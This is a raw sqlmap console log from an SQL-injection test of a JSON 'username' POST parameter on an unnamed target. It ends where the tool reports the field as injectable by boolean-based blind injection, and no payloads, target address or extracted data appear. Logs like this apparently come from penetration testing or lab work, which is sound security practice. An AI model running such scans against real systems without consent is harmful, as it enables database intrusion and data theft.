        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:43:59 /2026-01-01/

[23:43:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-TW; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[23:44:00] [INFO] testing connection to the target URL
[23:44:02] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:44:04] [INFO] testing if the target URL content is stable
[23:44:05] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[23:44:05] [INFO] testing if (custom) POST parameter 'JSON username' is dynamic
[23:44:07] [WARNING] (custom) POST parameter 'JSON username' does not appear to be dynamic
[23:44:09] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON username' might not be injectable
[23:44:10] [INFO] testing for SQL injection on (custom) POST parameter 'JSON username'
[23:44:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:44:26] [INFO] (custom) POST parameter 'JSON username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
